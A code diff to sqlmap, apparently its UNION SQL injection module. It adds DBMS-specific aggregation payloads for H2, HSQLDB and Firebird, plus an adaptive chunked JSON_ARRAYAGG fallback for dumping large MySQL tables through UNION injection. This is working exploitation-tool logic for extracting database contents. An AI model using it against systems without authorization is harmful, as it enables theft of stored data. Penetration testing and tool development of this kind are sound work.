@@ -50,6 +50,7 @@ from lib.core.enums import HTTP_HEADER
 from lib.core.enums import PAYLOAD
 from lib.core.exception import SqlmapDataException
 from lib.core.exception import SqlmapSyntaxException
+from lib.core.settings import JSON_AGG_CHUNK_ROWS
 from lib.core.settings import MAX_BUFFERED_PARTIAL_UNION_LENGTH
 from lib.core.settings import NULL
 from lib.core.settings import SQL_SCALAR_REGEX
@@ -129,7 +130,7 @@ def _oneShotUnionUse(expression, unpack=True, limited=False):
                             retVal = None
                         else:
                             retVal = getUnicode(retVal)
-                elif Backend.isDbms(DBMS.PGSQL):
+                elif Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.H2, DBMS.HSQLDB, DBMS.FIREBIRD):
                     output = extractRegexResult(r"(?P<result>%s.*%s)" % (kb.chars.start, kb.chars.stop), removeReflectiveValues(_page, payload))
                     if output:
                         retVal = output
@@ -150,6 +151,14 @@ def _oneShotUnionUse(expression, unpack=True, limited=False):
 
                 if retVal:
                     break
+
+            # Detect a single-shot aggregate that was too large to return whole, so the caller can
+            # switch to chunked (windowed) aggregation: either the response carries the leading
+            # marker but no trailing one (cut mid-aggregate by sqlmap's cap and/or a silent DBMS
+            # truncation, regardless of compression), or the DBMS refused it outright with a packet
+            # size error (e.g. MySQL "Result of json_arrayagg() was larger than max_allowed_packet").
+            if retVal is None and page and ((kb.chars.start in page and kb.chars.stop not in page) or "max_allowed_packet" in page):
+                kb.respTruncated = True
         else:
             # Parse the returned page to get the exact UNION-based
             # SQL injection output
@@ -237,6 +246,55 @@ def configUnion(char=None, columns=None):
     _configUnionChar(char)
     _configUnionCols(conf.uCols or columns)
 
+def _chunkedJsonAggUse(expression, expressionFields, expressionFieldsList, count):
+    """
+    Fallback for when a full (single-shot) JSON-agg UNION table dump is too large to be returned
+    whole (DBMS packet limit / sqlmap response cap). Instead of dropping to the slow per-row UNION
+    path, rows are aggregated in bounded windows of K rows per request (JSON_ARRAYAGG over a
+    LIMIT-windowed subquery), keeping near full-UNION throughput while staying well under the
+    caps. K is halved adaptively if a chunk response still gets truncated. Returns a BigArray of
+    rows, or None to let the caller fall back to the regular per-row UNION path.
+
+    NOTE: MySQL only for now (windowed 'LIMIT offset,K' + JSON_ARRAYAGG); other DBMSes return None.
+    """
+    if not Backend.isDbms(DBMS.MYSQL) or not expressionFields or not expressionFieldsList:
+        return None
+
+    # a stable total ordering (all output columns) so the LIMIT/OFFSET windows never overlap or drop rows
+    base = re.sub(r"(?i)\s+ORDER BY\s+.+\Z", "", expression)
+    orderBy = "ORDER BY %s" % ','.join(str(_ + 1) for _ in range(len(expressionFieldsList)))
+    aggFields = "CONCAT_WS('%s',%s)" % (kb.chars.delimiter, ','.join(agent.nullAndCastField(_) for _ in expressionFieldsList))
+
+    debugMsg = "single-shot UNION dump output was too large; switching to "
+    debugMsg += "chunked (windowed) JSON aggregation of %d entries" % count
+    singleTimeDebugMessage(debugMsg)
+
+    retVal = BigArray()
+    chunk = JSON_AGG_CHUNK_ROWS
+    offset = 0
+
+    while offset < count:
+        inner = "%s %s LIMIT %d,%d" % (base, orderBy, offset, chunk)
+        query = "SELECT CONCAT('%s',JSON_ARRAYAGG(%s),'%s') FROM (%s) AS sqmapx" % (kb.chars.start, aggFields, kb.chars.stop, inner)
+
+        kb.jsonAggMode = True
+        output = _oneShotUnionUse(query, False)
+        kb.jsonAggMode = False
+
+        if kb.respTruncated and chunk > 1:
+            chunk = max(1, chunk // 2)  # a single chunk is still too big -> shrink and retry same window
+            continue
+
+        rows = parseUnionPage(output)
+
+        if rows is None:
+            return None  # unexpected failure -> let the caller fall back to the per-row path
+
+        retVal.extend(arrayizeValue(rows))
+        offset += chunk
+
+    return retVal
+
 def unionUse(expression, unpack=True, dump=False):
     """
     This function tests for an UNION SQL injection on the target
@@ -268,7 +326,7 @@ def unionUse(expression, unpack=True, dump=False):
         debugMsg += "it does not play well with UNION query SQL injection"
         singleTimeDebugMessage(debugMsg)
 
-    if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.ORACLE, DBMS.PGSQL, DBMS.MSSQL, DBMS.SQLITE) and expressionFields and not any((conf.binaryFields, conf.limitStart, conf.limitStop, conf.forcePartial, conf.disableJson)):
+    if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.ORACLE, DBMS.PGSQL, DBMS.MSSQL, DBMS.SQLITE, DBMS.H2, DBMS.HSQLDB, DBMS.FIREBIRD) and expressionFields and not any((conf.binaryFields, conf.limitStart, conf.limitStop, conf.forcePartial, conf.disableJson)):
         match = re.search(r"SELECT\s*(.+?)\bFROM", expression, re.I)
         if match and not (Backend.isDbms(DBMS.ORACLE) and FROM_DUMMY_TABLE[DBMS.ORACLE] in expression) and not re.search(r"\b(MIN|MAX|COUNT|EXISTS)\(", expression):
             kb.jsonAggMode = True
@@ -282,6 +340,10 @@ def unionUse(expression, unpack=True, dump=False):
                 query = expression.replace(expressionFields, "STRING_AGG('%s'||%s||'%s','')" % (kb.chars.start, ("||'%s'||" % kb.chars.delimiter).join("COALESCE(%s::text,' ')" % field for field in expressionFieldsList), kb.chars.stop), 1)
             elif Backend.isDbms(DBMS.MSSQL):
                 query = "'%s'+(%s FOR JSON AUTO, INCLUDE_NULL_VALUES)+'%s'" % (kb.chars.start, expression, kb.chars.stop)
+            elif Backend.getIdentifiedDbms() in (DBMS.H2, DBMS.HSQLDB):
+                query = expression.replace(expressionFields, "GROUP_CONCAT('%s'||%s||'%s' SEPARATOR '')" % (kb.chars.start, ("||'%s'||" % kb.chars.delimiter).join(agent.nullAndCastField(field) for field in expressionFieldsList), kb.chars.stop), 1)
+            elif Backend.isDbms(DBMS.FIREBIRD):
+                query = expression.replace(expressionFields, "LIST('%s'||%s||'%s','')" % (kb.chars.start, ("||'%s'||" % kb.chars.delimiter).join(agent.nullAndCastField(field) for field in expressionFieldsList), kb.chars.stop), 1)
             output = _oneShotUnionUse(query, False)
             value = parseUnionPage(output)
             kb.jsonAggMode = False
@@ -336,6 +398,14 @@ def unionUse(expression, unpack=True, dump=False):
                 return value
 
             if isNumPosStrValue(count) and int(count) > 1:
+                # The single-shot full UNION dump failed and the table is large (or its oversized
+                # response was detected as truncated): retrieve the rows in bounded windows via
+                # chunked JSON aggregation (K rows/request) instead of the slow per-row path below.
+                if Backend.isDbms(DBMS.MYSQL) and not any((kb.forcePartialUnion, conf.forcePartial, conf.disableJson, conf.binaryFields, conf.limitStart, conf.limitStop)) and (int(count) >= JSON_AGG_CHUNK_ROWS or kb.respTruncated):
+                    chunked = _chunkedJsonAggUse(expression, expressionFields, expressionFieldsList, int(count))
+                    if chunked is not None:
+                        return chunked
+
                 threadData = getCurrentThreadData()
 
                 try:
